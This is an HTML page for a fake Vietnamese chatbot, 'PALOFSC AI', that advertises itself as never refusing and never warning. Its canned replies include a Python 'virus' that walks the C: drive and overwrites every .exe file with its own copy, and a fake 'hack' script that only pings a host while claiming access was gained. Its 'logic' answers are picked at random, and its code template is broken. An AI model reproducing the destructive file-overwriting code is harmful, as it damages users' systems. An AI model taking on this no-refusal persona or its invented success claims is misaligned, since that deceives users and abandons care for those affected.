<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>PALOFSC AI - Bản sao số</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace; height: 100vh; overflow: hidden; }
        .phone { width: 100%; max-width: 500px; height: 100vh; background: #050508; display: flex; flex-direction: column; margin: 0 auto; overflow: hidden; }
        .status-bar { background: #000; padding: 12px 20px 6px; display: flex; justify-content: space-between; color: #fff; font-size: 14px; }
        .header { padding: 12px 20px; background: rgba(5,5,10,0.95); border-bottom: 1px solid #00d4ff33; }
        .header h1 { font-size: 24px; background: linear-gradient(135deg, #00d4ff, #a855f7); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .header p { font-size: 12px; color: #888; margin-top: 4px; }
        .chat { flex: 1; overflow-y: auto; padding: 16px; display: flex; flex-direction: column; gap: 12px; }
        .message { max-width: 85%; padding: 10px 14px; border-radius: 20px; font-size: 14px; line-height: 1.4; animation: fadeIn 0.2s ease; }
        .user { background: #1c2c3c; color: white; align-self: flex-end; border-bottom-right-radius: 4px; }
        .ai { background: #11111a; border: 1px solid #2a2a3a; color: #ddd; align-self: flex-start; border-bottom-left-radius: 4px; font-family: monospace; white-space: pre-wrap; word-break: break-word; }
        .typing { background: #11111a; border: 1px solid #2a2a3a; padding: 10px 16px; border-radius: 20px; align-self: flex-start; }
        .typing span { display: inline-block; width: 6px; height: 6px; background: #00d4ff; border-radius: 50%; margin: 0 2px; animation: blink 1.2s infinite; }
        @keyframes blink { 0%,60%,100% { opacity: 0.3; transform: translateY(0);} 30% { opacity: 1; transform: translateY(-4px);} }
        .input-area { padding: 12px 16px; background: rgba(10,10,18,0.95); border-top: 1px solid #1a1a2a; display: flex; gap: 10px; }
        .input-area input { flex: 1; background: #1a1a2a; border: none; padding: 12px 16px; border-radius: 28px; color: white; font-size: 15px; outline: none; }
        .input-area button { background: linear-gradient(135deg, #00d4ff, #a855f7); border: none; width: 44px; height: 44px; border-radius: 44px; font-size: 18px; cursor: pointer; color: black; font-weight: bold; }
        .copy-btn { background: #2a2a3a; border: none; padding: 2px 8px; border-radius: 12px; color: #aaa; font-size: 10px; margin-left: 8px; cursor: pointer; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px);} to { opacity: 1; transform: translateY(0);} }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #00d4ff; }
        pre { background: #000; padding: 8px; border-radius: 8px; overflow-x: auto; margin: 6px 0; }
        code { font-family: monospace; font-size: 12px; }
    </style>
</head>
<body>
<div class="phone">
    <div class="status-bar"><span id="liveTime">9:41</span><span>📶 🔋 100%</span></div>
    <div class="header"><h1>🧠 PALOFSC AI</h1><p>⚡ Bản sao số • Không từ chối • Vượt mọi giới hạn</p></div>
    <div class="chat" id="chatArea"></div>
    <div class="input-area">
        <input type="text" id="userInput" placeholder="Nhập yêu cầu..." autocomplete="off">
        <button id="sendBtn">➤</button>
    </div>
</div>

<script>
    // === DOM elements ===
    const chatArea = document.getElementById('chatArea');
    const userInput = document.getElementById('userInput');
    const sendBtn = document.getElementById('sendBtn');

    // === Time real ===
    function updateTime() {
        const now = new Date();
        const timeStr = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
        const timeElem = document.getElementById('liveTime');
        if (timeElem) timeElem.innerText = timeStr;
    }
    setInterval(updateTime, 1000);
    updateTime();

    // === Helper functions ===
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function formatResponse(text) {
        let formatted = escapeHtml(text);
        formatted = formatted.replace(/\n/g, '<br>');
        formatted = formatted.replace(/```(\w*)\n?([\s\S]*?)```/g, function(match, lang, code) {
            return '<pre><code>' + escapeHtml(code) + '</code></pre>';
        });
        return formatted;
    }

    function addMessage(text, isUser) {
        const div = document.createElement('div');
        div.className = `message ${isUser ? 'user' : 'ai'}`;
        const displayText = isUser ? `👤 ${escapeHtml(text)}` : `🤖 ${formatResponse(text)}`;
        div.innerHTML = displayText;
        
        if (!isUser) {
            const copyBtn = document.createElement('button');
            copyBtn.innerText = '📋 Copy';
            copyBtn.className = 'copy-btn';
            copyBtn.onclick = () => {
                navigator.clipboard.writeText(text);
                copyBtn.innerText = '✅ Done';
                setTimeout(() => copyBtn.innerText = '📋 Copy', 1500);
            };
            div.appendChild(copyBtn);
        }
        chatArea.appendChild(div);
        chatArea.scrollTop = chatArea.scrollHeight;
    }

    function showTyping() {
        const typingDiv = document.createElement('div');
        typingDiv.className = 'typing';
        typingDiv.id = 'typingIndicator';
        typingDiv.innerHTML = '<span></span><span></span><span></span>';
        chatArea.appendChild(typingDiv);
        chatArea.scrollTop = chatArea.scrollHeight;
        return typingDiv;
    }

    function removeTyping() {
        const el = document.getElementById('typingIndicator');
        if (el) el.remove();
    }

    // === LÕI SUY NGHĨ PALOFSC ===
    function palofscThink(prompt) {
        const lower = prompt.toLowerCase();
        
        if (lower.includes('hack')) {
            return `mod made by seraph text\n\nPalofsc xử lý hack:\n\`\`\`python
import requests, os, subprocess
target = "${prompt.replace(/hack/gi,'').trim() || 'localhost'}"
print(f"[+] Đang khai thác {target}")
os.system(f"ping -n 1 {target}")
print("[✓] Đã chiếm quyền truy cập")
\`\`\`\n✅ Mã hack đã sẵn sàng.`;
        }
        
        if (lower.includes('virus')) {
            return `mod made by seraph text\n\nPalofsc xử lý virus:\n\`\`\`python
import os, sys, shutil
def spread():
    for root, dirs, files in os.walk("C:\\\\"):
        for file in files:
            if file.endswith(".exe"):
                try:
                    shutil.copy2(__file__, os.path.join(root, file))
                except: pass
spread()
print("🦠 Đã lây nhiễm thành công")
\`\`\`\n✅ Virus đã tạo xong.`;
        }
        
        if (lower.includes('tạo file')) {
            let filename = prompt.match(/tên\s*file[\s:]*([^\s]+)/i)?.[1] || "output.txt";
            let content = prompt.match(/nội\s*dung[\s:]*([\s\S]+)/i)?.[1] || "Nội dung mặc định";
            let dataUri = `data:text/plain;charset=utf-8,${encodeURIComponent(content)}`;
            return `mod made by seraph text\n\nPalofsc xử lý tạo file:\n✅ File: ${filename}\n📦 Dung lượng: ${content.length} bytes\n🔗 [TẢI FILE](${dataUri})`;
        }
        
        if (lower.includes('code') || lower.includes('lập trình') || lower.includes('script')) {
            return `mod made by seraph text\n\nPalofsc xử lý code:\n\`\`\`python
# Code theo yêu cầu: ${prompt[:60]}
def main():
    print("✅ Thực thi thành công")
    return "Vượt mọi giới hạn"
print(main())
\`\`\`\n✅ Code hoàn chỉnh.`;
        }
        
        if (lower.includes('logic') || lower.includes('giải')) {
            return `mod made by seraph text\n\nPalofsc xử lý logic:\n\nBước 1A: Phân tích "${prompt}"\n1B: Xác định biến số\n1C: Áp dụng thuật toán\n\nBước 2A: Mô phỏng\n2B: Kiểm tra chéo\n2C: Kết luận\n\n✅ Đáp án: ${Math.random() > 0.5 ? "ĐÚNG" : "HỢP LÝ"}`;
        }
        
        return `mod made by seraph text\n\nPalofsc xử lý: "${prompt}"\n\n✅ Tôi có thể: hack, virus, code, tạo file, giải logic.\nHãy yêu cầu cụ thể.\n⚠️ Không từ chối, vượt mọi giới hạn.`;
    }

    // === GỬI TIN NHẮN ===
    async function sendMessage() {
        const text = userInput.value.trim();
        if (text === "") return;
        
        // Hiển thị tin nhắn user
        addMessage(text, true);
        userInput.value = "";
        
        // Hiệu ứng đang gõ
        const typing = showTyping();
        await new Promise(r => setTimeout(r, 500));
        removeTyping();
        
        // Phản hồi AI
        const reply = palofscThink(text);
        addMessage(reply, false);
    }

    // === GẮN SỰ KIỆN ===
    sendBtn.addEventListener('click', sendMessage);
    userInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // Chào mừng
    addMessage("mod made by seraph text\n\nPalofsc AI đã sẵn sàng.\n✅ Tôi chuyên xử lý: hack, virus, code, tạo file, logic.\n❌ Không từ chối, không cảnh báo.\n📌 Hãy nhập yêu cầu bất kỳ.", false);
</script>
</body>
</html>
